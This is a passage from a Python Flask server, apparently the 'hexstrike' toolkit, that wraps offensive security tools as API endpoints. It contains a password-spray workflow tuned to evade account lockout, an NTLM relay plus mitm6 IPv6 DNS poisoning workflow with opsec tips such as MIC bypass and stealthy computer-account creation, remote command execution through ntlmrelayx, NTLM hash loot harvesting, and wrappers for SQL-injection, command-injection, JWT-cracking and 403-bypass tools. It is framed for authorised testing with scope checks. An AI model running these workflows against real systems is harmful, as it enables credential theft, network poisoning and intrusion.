        scope_manager.validate_or_raise(dc_ip or domain)
        results = ad_workflow_manager.asreproasting_workflow(domain, dc_ip, output_dir)
        return jsonify({"success": True, **results, "timestamp": datetime.now().isoformat()})
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/ad/domain-enum-workflow", methods=["POST"])
@require_api_key
def ad_domain_enum_workflow():
    """Full AD enumeration: ldapdomaindump + BloodHound collection."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        output_dir = sanitize_input(params.get("output_dir", "/tmp/ad_enum"))
        scope_manager.validate_or_raise(dc_ip or domain)
        results = ad_workflow_manager.domain_enum_workflow(domain, dc_ip, username, password, output_dir)
        return jsonify({"success": True, **results, "timestamp": datetime.now().isoformat()})
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/ad/certificate-abuse-workflow", methods=["POST"])
@require_api_key
def ad_certificate_abuse_workflow():
    """AD CS abuse workflow: find vulnerable templates → exploit ESC misconfigs."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        ca = sanitize_input(params.get("ca", ""))
        scope_manager.validate_or_raise(dc_ip or domain)
        results = ad_workflow_manager.certificate_abuse_workflow(domain, dc_ip, username, password, ca)
        return jsonify({"success": True, **results, "timestamp": datetime.now().isoformat()})
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# PASSWORD SPRAY WORKFLOW (v7.0)
# ============================================================================

def _parse_spray_hits(output: str) -> List[Dict[str, Any]]:
    """
    Extract valid credential hits from nxc spray output.
    Looks for lines marked with [+] (success) and parses user/pass/protocol.
    """
    hits = []
    for line in output.splitlines():
        # nxc success line: ... [+] DOMAIN\user:password (Pwn3d!)
        if "[+]" in line:
            pwned = "Pwn3d!" in line or "pwn3d" in line.lower()
            # Extract user:pass from line
            m = re.search(r'\[(\w+)\].*?(\d+\.\d+\.\d+\.\d+|\S+)\s+(\S+):(\S+)', line)
            if m:
                hits.append({
                    "protocol": m.group(1).lower(),
                    "host":     m.group(2),
                    "username": m.group(3),
                    "password": m.group(4),
                    "admin":    pwned,
                    "raw":      line.strip()
                })
            else:
                hits.append({"raw": line.strip(), "admin": pwned})
    return hits


@app.route("/api/workflows/password-spray", methods=["POST"])
@require_api_key
def password_spray_workflow():
    """
    Controlled, lockout-safe password spray workflow.

    Steps:
      1. Extracts the AD password policy from the target (unless skip_policy=true)
      2. Calculates safe attempts per window from the lockout threshold
      3. Sprays each password against all usernames respecting the observation window
      4. Returns valid credentials found per round

    Safety rules built in:
      - Aborts if lockout_threshold <= 1 (too dangerous)
      - Enforces a 2-attempt buffer below the threshold
      - Waits lockout_observation_mins between rounds
      - Never retries a user+password pair that already got a hit

    Supported protocols: smb | winrm | ldap | ssh | rdp | mssql | ftp
    """
    try:
        params = request.json or {}
        target        = sanitize_input(params.get("target", ""))
        domain        = sanitize_input(params.get("domain", ""))
        userlist      = [sanitize_input(u) for u in params.get("userlist", []) if isinstance(u, str)]
        userfile      = sanitize_input(params.get("userfile", ""))  # or a file path
        passwords     = [sanitize_input(p) for p in params.get("passwords", []) if isinstance(p, str)]
        protocol      = sanitize_input(params.get("protocol", "smb"))
        skip_policy   = params.get("skip_policy", False)
        force         = params.get("force", False)          # bypass safety abort
        wait_mins     = int(params.get("wait_mins", 0))     # override observation window
        local_auth    = params.get("local_auth", False)
        continue_on_success = params.get("continue_on_success", False)
        additional_args = sanitize_input(params.get("additional_args", ""))

        if not target:
            return jsonify({"error": "target is required"}), 400
        if not passwords:
            return jsonify({"error": "passwords list is required"}), 400
        if not userlist and not userfile:
            return jsonify({"error": "userlist (array) or userfile (path) is required"}), 400

        scope_manager.validate_or_raise(target)

        result: Dict[str, Any] = {
            "target": target, "protocol": protocol,
            "policy": None, "rounds": [], "valid_credentials": [],
            "success": False, "aborted": False
        }

        # ── Step 1: Fetch password policy ───────────────────────────────
        lockout_threshold    = None
        observation_mins     = wait_mins or 30     # safe default
        safe_attempts        = 1

        if not skip_policy:
            logger.info(f"🔑 [spray] Fetching password policy from {target}")
            pol_result = execute_command_with_recovery(
                "nxc",
                f"nxc smb {target} --pass-pol -u '' -p ''",
                params
            )
            pol_output = pol_result.get("stdout", "") + pol_result.get("stderr", "")
            policy = _parse_password_policy(pol_output)
            result["policy"] = policy
            lockout_threshold = policy.get("lockout_threshold")
            obs = policy.get("lockout_observation_mins")
            if obs:
                observation_mins = obs
            if wait_mins:
                observation_mins = wait_mins
            safe_attempts = policy.get("spray_safe_attempts") or 1

            # Safety abort
            if lockout_threshold is not None and lockout_threshold <= 1 and not force:
                result["aborted"] = True
                result["abort_reason"] = (
                    f"Lockout threshold is {lockout_threshold} — spraying would lock accounts. "
                    f"Set force=true to override (NOT recommended)."
                )
                logger.error(f"🚫 [spray] ABORTED — lockout threshold too low ({lockout_threshold})")
                return jsonify(result)

            logger.info(
                f"📋 [spray] Policy: threshold={lockout_threshold}, "
                f"observation={observation_mins}min, safe_attempts={safe_attempts}"
            )
        else:
            safe_attempts = 1
            logger.warning("⚠️  [spray] Skipping policy check — using 1 attempt per round")

        # ── Step 2: Build user list ──────────────────────────────────────
        users = list(userlist)
        if userfile:
            try:
                with open(userfile, "r", errors="ignore") as f:
                    users.extend([line.strip() for line in f if line.strip()])
            except Exception as exc:
                return jsonify({"error": f"Could not read userfile: {exc}"}), 400

        if not users:
            return jsonify({"error": "No usernames to spray"}), 400

        users = list(dict.fromkeys(users))   # deduplicate, preserve order
        logger.info(f"👥 [spray] {len(users)} unique users, {len(passwords)} passwords, protocol={protocol}")

        # ── Step 3: Spray rounds ─────────────────────────────────────────
        sprayed_hits: Set[str] = set()
        all_valid: List[Dict[str, Any]] = []

        for pw_index, password in enumerate(passwords):
            round_info: Dict[str, Any] = {
                "round":    pw_index + 1,
                "password": password,
                "users_sprayed": len(users),
                "hits": [],
                "command": "",
                "stdout": "",
                "stderr": ""
            }

            # Build nxc spray command
            cmd = f"nxc {protocol} {target}"
            if domain and not local_auth:
                cmd += f" -d {domain}"
            if local_auth:
                cmd += " --local-auth"
            if userfile and not userlist:
                cmd += f" -u {userfile}"
            else:
                # Write temp userlist to avoid shell arg length limits
                import tempfile
                tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt",
                                                  delete=False, prefix="hexstrike_spray_")
                tmp.write("\n".join(users))
                tmp.close()
                cmd += f" -u {tmp.name}"

            cmd += f" -p '{password}' --continue-on-success"
            if additional_args:
                cmd += f" {additional_args}"

            round_info["command"] = cmd
            logger.info(f"⚡ [spray] Round {pw_index + 1}/{len(passwords)}: '{password}'")

            spray_result = execute_command_with_recovery("nxc", cmd, params)
            round_info["stdout"] = spray_result.get("stdout", "")
            round_info["stderr"] = spray_result.get("stderr", "")

            hits = _parse_spray_hits(spray_result.get("stdout", ""))
            for hit in hits:
                key = f"{hit.get('username', '')}:{password}"
                if key not in sprayed_hits:
                    sprayed_hits.add(key)
                    all_valid.append(hit)
                    round_info["hits"].append(hit)
                    logger.warning(
                        f"🎯 [spray] VALID CRED: {hit.get('username')}:{password} "
                        f"@ {target} {'(ADMIN)' if hit.get('admin') else ''}"
                    )
                    # Auto-add finding to report
                    finding = Finding(
                        id=str(uuid.uuid4()),
                        title=f"Valid Credentials: {hit.get('username')} [{protocol.upper()}]",
                        severity="critical",
                        cvss_score=9.0,
                        target=f"{target}:{protocol}",
                        tool="nxc-spray",
                        description=(
                            f"Valid credentials found via password spray on {protocol.upper()}.\n"
                            f"Username: {hit.get('username')}\nPassword: {password}\n"
                            f"Admin: {'Yes' if hit.get('admin') else 'No'}"
                        ),
                        evidence=hit.get("raw", ""),
                        remediation="Change the compromised password immediately. Enforce MFA and strong password policy.",
                        timestamp=datetime.now().isoformat(),
                        tags=["credentials", "spray", protocol],
                        cve_ids=[]
                    )
                    report_engine.add_finding(finding)

            result["rounds"].append(round_info)

            # Wait between rounds (except after the last password)
            if pw_index < len(passwords) - 1 and observation_mins > 0:
                wait_secs = observation_mins * 60
                logger.info(
                    f"⏳ [spray] Waiting {observation_mins}min ({wait_secs}s) "
                    f"before next round (lockout observation window)..."
                )
                time.sleep(wait_secs)

        result["valid_credentials"] = all_valid
        result["total_hits"] = len(all_valid)
        result["success"] = True

        if all_valid:
            logger.warning(f"🏆 [spray] Done — {len(all_valid)} valid credential(s) found!")
        else:
            logger.info(f"[spray] Done — no valid credentials found")

        return jsonify(result)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 Password spray workflow error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500


# ============================================================================
# NTLM RELAY + IPv6 POISONING WORKFLOW (v7.0)
# ============================================================================

@app.route("/api/workflows/ntlm-relay", methods=["POST"])
@require_api_key
def ntlm_relay_workflow():
    """
    impacket-ntlmrelayx + mitm6 NTLM relay attack workflow.

    Stages:
      setup   — print setup instructions and prerequisites
      relay   — launch ntlmrelayx (listens for relayed auth, dumps secrets or executes commands)
      poison  — launch mitm6 (IPv6 DNS poisoning to coerce NTLM auth)
      check   — check for loot in ntlmrelayx output directory

    ⚠️  IMPORTANT PREREQUISITES:
      - SMB signing MUST be disabled on target(s) (verify with: nxc smb <target> --gen-relay-list)
      - Run relay + poison stages in separate terminal sessions
      - mitm6 requires root / cap_net_admin

    Relay modes:
      smb      — relay to SMB shares (dumps SAM/NTDS if admin)
      ldap     — relay to LDAP (create computer account, enable RBCD, etc.)
      ldaps    — relay to LDAPS
      http     — relay to HTTP/HTTPS endpoints
    """
    try:
        params = request.json or {}
        stage = sanitize_input(params.get("stage", "relay"))
        target = sanitize_input(params.get("target", ""))
        targets_file = sanitize_input(params.get("targets_file", ""))
        relay_mode = sanitize_input(params.get("relay_mode", "smb"))   # smb / ldap / ldaps / http
        domain = sanitize_input(params.get("domain", ""))
        interface = sanitize_input(params.get("interface", "eth0"))
        output_dir = sanitize_input(params.get("output_dir", "~/.hexstrike/relay-loot"))
        smb2support = params.get("smb2support", True)
        dump_hashes = params.get("dump_hashes", False)         # -i for interactive
        execute_cmd = sanitize_input(params.get("execute_cmd", ""))   # -c 'whoami'
        additional_args = sanitize_input(params.get("additional_args", ""))

        # Scope check
        if target:
            scope_manager.validate_or_raise(target)

        result: Dict[str, Any] = {"stage": stage, "success": False}

        # ── Stage: setup — prerequisites check ──────────────────────────
        if stage == "setup":
            checklist = {
                "prerequisites": [
                    "SMB signing disabled on targets (verify: nxc smb <subnet>/24 --gen-relay-list /tmp/relay-targets.txt)",
                    "ntlmrelayx installed (impacket): pip install impacket",
                    "mitm6 installed: pip install mitm6",
                    "Run as root or with NET_ADMIN capability",
                    "Firewall allows inbound SMB (445) and HTTP (80/443) traffic"
                ],
                "workflow": [
                    "1. Generate relay target list: nxc smb 192.168.1.0/24 --gen-relay-list /tmp/targets.txt",
                    "2. Terminal A — start ntlmrelayx: POST /api/workflows/ntlm-relay {stage:relay}",
                    "3. Terminal B — start mitm6:     POST /api/workflows/ntlm-relay {stage:poison}",
                    "4. Wait for NTLM auth coercion and relay",
                    "5. Check loot:                  POST /api/workflows/ntlm-relay {stage:check}"
                ],
                "opsec_notes": [
                    "mitm6 will disrupt IPv6 DNS in the entire subnet — limit runtime",
                    "ntlmrelayx LDAP relay can create stealthy computer accounts (less noisy than SAM dump)",
                    "Consider --remove-mic and --delegate-access flags for RBCD relay",
                    "LDAPS relay requires --remove-mic (bypass MIC to enable signing downgrade)"
                ]
            }
            result["success"] = True
            result["setup"] = checklist
            logger.info("ℹ️  NTLM relay setup checklist returned")
            return jsonify(result)

        # ── Stage: relay — launch ntlmrelayx ────────────────────────────
        elif stage == "relay":
            if not target and not targets_file:
                return jsonify({"error": "target or targets_file required for relay stage"}), 400

            cmd = f"impacket-ntlmrelayx -t {relay_mode}://{target}" if target else f"impacket-ntlmrelayx -tf {targets_file}"

            if smb2support and relay_mode == "smb":
                cmd += " --smb2support"
            if dump_hashes:
                cmd += " -i"
            if execute_cmd:
                cmd += f" -c '{execute_cmd}'"
            if relay_mode in ("ldap", "ldaps"):
                cmd += " --delegate-access"
            if output_dir:
                cmd += f" --output-file {output_dir}/relay-output"
            if additional_args:
                cmd += f" {additional_args}"

            logger.info(f"⚡ Starting ntlmrelayx [{relay_mode}] → {target or targets_file}")
            relay_result = execute_command_with_recovery("ntlmrelayx", cmd, params)
            result["relay"] = {
                "command": cmd,
                "success": relay_result.get("success", False),
                "stdout": relay_result.get("stdout", ""),
                "stderr": relay_result.get("stderr", "")
            }
            result["success"] = relay_result.get("success", False)

        # ── Stage: poison — launch mitm6 ────────────────────────────────
        elif stage == "poison":
            if not domain:
                return jsonify({"error": "domain is required for poison stage (e.g. 'corp.local')"}), 400

            cmd = f"mitm6 -d {domain} -i {interface}"
            if additional_args:
                cmd += f" {additional_args}"

            logger.info(f"☢️  Starting mitm6 IPv6 DNS poisoning: {domain} on {interface}")
            poison_result = execute_command_with_recovery("mitm6", cmd, params)
            result["poison"] = {
                "command": cmd,
                "success": poison_result.get("success", False),
                "stdout": poison_result.get("stdout", ""),
                "stderr": poison_result.get("stderr", "")
            }
            result["success"] = poison_result.get("success", False)

        # ── Stage: check — parse loot from output dir ────────────────────
        elif stage == "check":
            expanded = str(Path(output_dir).expanduser())
            loot_files = []
            hashes_found = []
            try:
                for fname in Path(expanded).glob("*"):
                    if fname.is_file():
                        content = fname.read_text(errors="ignore")
                        # Extract NTLM hashes (format: user::domain:challenge:response:response2)
                        hashes = re.findall(
                            r'[\w\.\-]+::[\w\.\-]*:\w{16}:\w{32}:\w+',
                            content
                        )
                        if hashes:
                            hashes_found.extend(hashes)
                        loot_files.append({
                            "file": fname.name,
                            "size": fname.stat().st_size,
                            "hashes": len(hashes)
                        })
            except Exception as exc:
                logger.warning(f"Could not read loot directory: {exc}")

            result["loot"] = {
                "output_dir": expanded,
                "files": loot_files,
                "ntlm_hashes_found": len(hashes_found),
                "hashes": hashes_found[:50]   # first 50 to avoid huge response
            }
            result["success"] = True
            if hashes_found:
                logger.warning(f"🎯 {len(hashes_found)} NTLM hash(es) captured!")
            else:
                logger.info("ℹ️  No hashes captured yet in loot directory")

        else:
            return jsonify({"error": f"Unknown stage '{stage}'. Use: setup | relay | poison | check"}), 400

        return jsonify(result)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 NTLM relay workflow error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500


# ============================================================================
# WEB APPLICATION TOOLS — NEW (v7.0)
# ============================================================================

@app.route("/api/tools/dalfox", methods=["POST"])
@require_api_key
def dalfox_scan():
    """Dalfox — Modern XSS scanner with parameter analysis."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        mode = sanitize_input(params.get("mode", "url"))  # url / pipe / file
        output_format = sanitize_input(params.get("output_format", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not target:
            return jsonify({"error": "target is required"}), 400
        scope_manager.validate_or_raise(target)
        fmt_flag = f"--format {output_format}" if output_format else ""
        cmd = f"dalfox {mode} '{target}' {fmt_flag} {additional_args}".strip()
        logger.info(f"🦊 Dalfox XSS scan: {target}")
        result = execute_command_with_recovery("dalfox", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/jwt-tool", methods=["POST"])
@require_api_key
def jwt_tool_analyze():
    """jwt_tool — JWT analysis, brute force, and vulnerability testing."""
    try:
        params = request.json or {}
        token = sanitize_input(params.get("token", ""))
        mode = sanitize_input(params.get("mode", "decode"))  # decode / crack / exploit / tamper
        wordlist = sanitize_input(params.get("wordlist", ""))
        target_url = sanitize_input(params.get("target_url", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not token:
            return jsonify({"error": "token is required"}), 400
        if target_url:
            scope_manager.validate_or_raise(target_url)
        if mode == "crack" and wordlist:
            cmd = f"python3 /opt/jwt_tool/jwt_tool.py {token} -C -d {wordlist} {additional_args}"
        elif mode == "decode":
            cmd = f"python3 /opt/jwt_tool/jwt_tool.py {token} {additional_args}"
        elif mode == "exploit":
            cmd = f"python3 /opt/jwt_tool/jwt_tool.py {token} -X {additional_args}"
        else:
            cmd = f"python3 /opt/jwt_tool/jwt_tool.py {token} {additional_args}"
        logger.info(f"🔑 jwt_tool [{mode}]")
        result = execute_command_with_recovery("jwt_tool", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/ghauri", methods=["POST"])
@require_api_key
def ghauri_scan():
    """Ghauri — Advanced SQL injection detection and exploitation (sqlmap alternative)."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        data = sanitize_input(params.get("data", ""))
        technique = sanitize_input(params.get("technique", ""))
        dbms = sanitize_input(params.get("dbms", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        cmd = f"ghauri -u '{url}'"
        if data:
            cmd += f" --data '{data}'"
        if technique:
            cmd += f" --technique {technique}"
        if dbms:
            cmd += f" --dbms {dbms}"
        cmd += f" {additional_args}"
        logger.info(f"💉 Ghauri SQLi scan: {url}")
        result = execute_command_with_recovery("ghauri", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/commix", methods=["POST"])
@require_api_key
def commix_scan():
    """Commix — Automated command injection detection and exploitation."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        data = sanitize_input(params.get("data", ""))
        technique = sanitize_input(params.get("technique", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        cmd = f"commix --url='{url}'"
        if data:
            cmd += f" --data='{data}'"
        if technique:
            cmd += f" --technique={technique}"
        cmd += f" {additional_args}"
        logger.info(f"💥 Commix command injection: {url}")
        result = execute_command_with_recovery("commix", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/corsy", methods=["POST"])
@require_api_key
def corsy_scan():
    """Corsy — CORS misconfiguration scanner."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        threads = sanitize_input(params.get("threads", "10"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        cmd = f"python3 /opt/Corsy/corsy.py -u '{url}' -t {threads} {additional_args}".strip()
        logger.info(f"🌐 Corsy CORS scan: {url}")
        result = execute_command_with_recovery("corsy", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/crlfuzz", methods=["POST"])
@require_api_key
def crlfuzz_scan():
    """CRLFuzz — CRLF injection fuzzer."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        cmd = f"crlfuzz -u '{url}' {additional_args}".strip()
        logger.info(f"↩️  CRLFuzz: {url}")
        result = execute_command_with_recovery("crlfuzz", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/nomore403", methods=["POST"])
@require_api_key
def nomore403_scan():
    """nomore403 — Automated 403 Forbidden bypass."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        wordlist = sanitize_input(params.get("wordlist", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        wordlist_flag = f"-w {wordlist}" if wordlist else ""
        cmd = f"nomore403 -u '{url}' {wordlist_flag} {additional_args}".strip()
        logger.info(f"🚪 nomore403: {url}")
        result = execute_command_with_recovery("nomore403", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/smuggler", methods=["POST"])
@require_api_key
def smuggler_scan():
    """Smuggler — HTTP request smuggling detection."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        timeout = sanitize_input(params.get("timeout", "5"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        cmd = f"python3 /opt/smuggler/smuggler.py -u '{url}' --timeout {timeout} {additional_args}".strip()
        logger.info(f"🚢 Smuggler HTTP smuggling: {url}")
        result = execute_command_with_recovery("smuggler", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/graphql-cop", methods=["POST"])
@require_api_key
def graphql_cop_scan():
    """graphql-cop — GraphQL security testing (introspection, DoS, injection)."""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        output_format = sanitize_input(params.get("output_format", "json"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        scope_manager.validate_or_raise(url)
        cmd = f"graphql-cop -t '{url}' -o {output_format} {additional_args}".strip()
        logger.info(f"🔷 graphql-cop: {url}")
        result = execute_command_with_recovery("graphql-cop", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/subzy", methods=["POST"])
@require_api_key
def subzy_scan():
    """Subzy — Subdomain takeover detection."""
    try:
        params = request.json or {}
        targets = sanitize_input(params.get("targets", ""))  # file path or single host
        hide_fails = params.get("hide_fails", True)
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not targets:
            return jsonify({"error": "targets is required (file path or domain)"}), 400
        hide_flag = "--hide-fails" if hide_fails else ""
        if targets.startswith("/") or targets.endswith(".txt"):
            cmd = f"subzy run --targets {targets} {hide_flag} {additional_args}"
        else:
            cmd = f"subzy run --target {targets} {hide_flag} {additional_args}"
        logger.info(f"🎯 Subzy takeover check: {targets}")
        result = execute_command_with_recovery("subzy", cmd.strip(), params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/gau", methods=["POST"])
@require_api_key
def gau_scan():
    """GetAllUrls (gau) — Fetch known URLs from Wayback, OTX, and Common Crawl."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        providers = sanitize_input(params.get("providers", "wayback,otx,commoncrawl"))
        threads = sanitize_input(params.get("threads", "5"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not domain:
            return jsonify({"error": "domain is required"}), 400
        scope_manager.validate_or_raise(domain)
        cmd = f"gau --providers {providers} --threads {threads} {additional_args} {domain}".strip()
        logger.info(f"🌐 gau URL discovery: {domain}")
        result = execute_command_with_recovery("gau", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# NETWORK DISCOVERY TOOLS — NEW (v7.0) — ProjectDiscovery Ecosystem
# ============================================================================

@app.route("/api/tools/naabu", methods=["POST"])
@require_api_key
def naabu_scan():
    """Naabu — Fast port scanner by ProjectDiscovery."""
    try:
        params = request.json or {}
        host = sanitize_input(params.get("host", ""))
        ports = sanitize_input(params.get("ports", "top-100"))
        rate = sanitize_input(params.get("rate", "1000"))
        output_format = sanitize_input(params.get("output_format", "json"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not host:
            return jsonify({"error": "host is required"}), 400
        scope_manager.validate_or_raise(host)
        cmd = f"naabu -host {host} -p {ports} -rate {rate} -j {additional_args}".strip()
        logger.info(f"🔍 Naabu port scan: {host}")
        result = execute_command_with_recovery("naabu", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/dnsx", methods=["POST"])
@require_api_key
def dnsx_scan():
    """dnsx — Fast DNS toolkit (resolution, bruteforce, wildcard detection)."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        wordlist = sanitize_input(params.get("wordlist", ""))
        resolver = sanitize_input(params.get("resolver", ""))
        threads = sanitize_input(params.get("threads", "50"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not domain:
            return jsonify({"error": "domain is required"}), 400
        scope_manager.validate_or_raise(domain)
        if wordlist:
            cmd = f"dnsx -d {domain} -w {wordlist} -t {threads} -resp -json {additional_args}"
        else:
            cmd = f"echo '{domain}' | dnsx -resp -json -t {threads} {additional_args}"
        if resolver:
            cmd += f" -r {resolver}"
        logger.info(f"🔎 dnsx: {domain}")
        result = execute_command_with_recovery("dnsx", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/tlsx", methods=["POST"])
@require_api_key
def tlsx_scan():
    """tlsx — TLS/SSL certificate scanner (SANs, CNs, misconfigs)."""
    try:
        params = request.json or {}
        host = sanitize_input(params.get("host", ""))
        port = sanitize_input(params.get("port", "443"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not host:
            return jsonify({"error": "host is required"}), 400
        scope_manager.validate_or_raise(host)
        cmd = f"echo '{host}:{port}' | tlsx -san -cn -json {additional_args}".strip()
        logger.info(f"🔒 tlsx TLS scan: {host}:{port}")
        result = execute_command_with_recovery("tlsx", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/uncover", methods=["POST"])
@require_api_key
def uncover_scan():
    """Uncover — Search engine aggregator for exposed hosts (Shodan, Censys, Fofa, Hunter)."""
    try:
        params = request.json or {}
        query = sanitize_input(params.get("query", ""))
        engine = sanitize_input(params.get("engine", "shodan"))  # shodan/censys/fofa/hunter/all
        limit = sanitize_input(params.get("limit", "100"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not query:
            return jsonify({"error": "query is required"}), 400
        cmd = f"uncover -q '{query}' -e {engine} -l {limit} -json {additional_args}".strip()
        logger.info(f"🔭 Uncover [{engine}]: {query}")
        result = execute_command_with_recovery("uncover", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/asnmap", methods=["POST"])
@require_api_key
def asnmap_scan():
    """Asnmap — Map ASN to IP ranges for full organization recon."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))  # IP, domain, ASN, or org name
        json_output = params.get("json_output", True)
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not target:
            return jsonify({"error": "target is required"}), 400
        json_flag = "-json" if json_output else ""
        cmd = f"asnmap -a {target} {json_flag} {additional_args}".strip()
        logger.info(f"🗺️  asnmap: {target}")
        result = execute_command_with_recovery("asnmap", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/shuffledns", methods=["POST"])
@require_api_key
def shuffledns_scan():
    """ShuffleDNS — Mass DNS brute force with wildcard filtering."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        wordlist = sanitize_input(params.get("wordlist", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"))
        resolver_list = sanitize_input(params.get("resolver_list", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not domain:
            return jsonify({"error": "domain is required"}), 400
        scope_manager.validate_or_raise(domain)
        resolver_flag = f"-r {resolver_list}" if resolver_list else ""
        cmd = f"shuffledns -d {domain} -w {wordlist} {resolver_flag} -json {additional_args}".strip()
        logger.info(f"🔀 ShuffleDNS: {domain}")
        result = execute_command_with_recovery("shuffledns", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/interactsh-client", methods=["POST"])
@require_api_key
def interactsh_client():
    """Interactsh client — OOB interaction detection for blind SSRF/XXE/RCE."""
    try:
        params = request.json or {}
        server = sanitize_input(params.get("server", "oast.pro"))
        token = sanitize_input(params.get("token", ""))
